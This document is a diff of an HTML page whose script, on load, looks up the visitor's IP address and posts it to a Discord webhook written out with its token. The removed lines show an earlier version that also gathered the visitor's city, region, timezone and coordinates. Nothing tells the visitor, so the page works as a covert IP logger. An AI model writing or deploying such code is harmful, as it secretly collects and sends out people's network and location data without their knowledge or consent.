@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <head>
 </head>
@@ -19,20 +20,14 @@
 // ip-api endpoint URL
 // we need only the countryCode, but you can request more fields
 // see http://ip-api.com/docs/api:json for documentation
-var endpoint = 'http://ip-api.com/json/';
+var endpoint = 'https://api.ipify.org?format=json';
 
 var xhr = new XMLHttpRequest();
 xhr.onreadystatechange = function() {
 	if (this.readyState == 4 && this.status == 200) {
 		var response = JSON.parse(this.responseText);
 
-		document.getElementById("1").innerHTML = "country:" + response.country;
-				document.getElementById("2").innerHTML = "region:" + response.regionName;
-						document.getElementById("3").innerHTML = "city:" + response.city;
-							document.getElementById("4").innerHTML = "timezone:" + response.timezone;
-							document.getElementById("5").innerHTML = "ip:" + response.query;
-									document.getElementById("6").innerHTML = "latitude:" + response.lat;
-											document.getElementById("7").innerHTML = "longitude:" + response.lon;
+		document.getElementById("1").innerHTML = "ip address:" + response.ip;
 	}
 };
 xhr.open('GET', endpoint, true);
@@ -41,12 +36,6 @@ xhr.send();
   setTimeout(function () {
     
 var one = document.getElementById("1").innerHTML;
-var two = document.getElementById("2").innerHTML;
-var three = document.getElementById("3").innerHTML;
-var four = document.getElementById("4").innerHTML;
-var five = document.getElementById("5").innerHTML;
-var six = document.getElementById("6").innerHTML;
-var seven = document.getElementById("7").innerHTML;
 
       const request = new XMLHttpRequest();
 request.open("POST", "https://discord.com/api/webhooks/1005626446825398404/jVq_oSk_X7L0oPmxafZysY98jE8ize989ifx0kbrquU0-G7MulcGQmcbbB973jVufW9r" );
@@ -70,36 +59,6 @@ const params = {
         {
           "name": "1",
           "value": `${one}`,
-          "inline": true
-        },
-        {
-          "name": "2",
-          "value": `${two}`,
-          "inline": true
-        },
-        {
-          "name": "3",
-          "value": `${three}`,
-          "inline": true
-        },
-        {
-          "name": "4",
-          "value": `${four}`,
-          "inline": true
-        },
-        {
-          "name": "5",
-          "value": `${five}`,
-          "inline": true
-        },
-        {
-          "name": "6",
-          "value": `${six}`,
-          "inline": true
-        },
-        {
-          "name": "7",
-          "value": `${seven}`,
           "inline": true
         }
       ]
